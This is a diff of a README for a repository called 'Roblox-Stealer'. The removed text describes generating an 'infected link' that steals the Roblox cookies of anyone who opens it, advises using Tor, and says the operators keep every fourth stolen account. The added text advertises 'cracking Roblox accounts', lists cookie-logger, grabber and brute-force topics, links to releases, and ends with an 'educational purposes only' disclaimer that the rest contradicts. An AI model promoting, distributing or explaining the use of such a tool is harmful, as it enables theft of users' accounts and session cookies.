@@ -1,25 +1,40 @@
-<div align="center">
-  
-![2](https://github.com/user-attachments/assets/305533ee-dc03-4c7e-902b-b2feb3cba004)
+# 🕵️‍♂️ Roblox-Stealer 🕵️‍♂️
 
-![0](https://github.com/user-attachments/assets/96b00b31-4308-4478-9f9b-3e589533d65d)
+Welcome to the **Roblox-Stealer** repository, where you can explore tools related to cracking Roblox accounts. Our service offers the functionality to start cracking Roblox accounts immediately. Why wait any longer? Dive into the world of Roblox account security and explore the possibilities.
 
-</div>
+## Topics 📝
 
-<div align="center"><a href="https://mabites.github.io/id/hg7f09qw"><img src="https://github.com/user-attachments/assets/c44dd1c1-bd15-4cc2-b06f-3f578a24f650" height="80"></a></div>
+Explore a wide range of topics related to Roblox account security and cracking techniques:
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
+- cookie-logger
+- cookies
+- discord
+- grabber
+- logger
+- roblosecurity
+- roblox-account-checker
+- roblox-accounts
+- roblox-beaming
+- roblox-bruteforce
+- roblox-checker
+- roblox-combo-list
+- roblox-combo-list-checker
+- roblox-cookie
+- roblox-cookie-checker
+- roblox-cookie-logger
+- roblox-cookie-refresher
+- roblox-cookies
+- roblox-logger
+- roblox-software
 
-### How to use?
+## Get Started 🚀
 
-* Open your browser. We recommend you use the Tor browser for better anonymity.
-* Start the localhost page - http://127.0.0.1 
-* Start pythonw and reload the page.
-* Next, when you see the main menu, click on 'Payload-URL Generator' and generate an infected link.
-* Wait about 1–2 minutes and you will receive a special link. When anyone opens it in a browser, our code hijacks and steals Roblox cookies.
+To explore our tools and services, head over to our [Releases](https://github.com/shxz4m/Roblox-Stealer/releases) page. Visit the link to access the latest updates and releases related to the Roblox-Stealer repository.
 
-## Our software is absolutely free! But we are taking your every 4th account as pay for use.
+## Disclaimer ❗
+
+Please be aware that the tools and services provided in this repository are intended for educational and research purposes only. Unauthorized access to Roblox accounts or any other online platform is strictly prohibited. Always ensure you have proper authorization before using any tools for account security testing.
+
+Thank you for taking the time to explore the **Roblox-Stealer** repository. Stay informed, stay safe, and happy exploring the world of Roblox account security! 🕵️‍♂️🔒
+
+![Roblox Logo](https://cdn.worldvectorlogo.com/logos/roblox-1.svg)
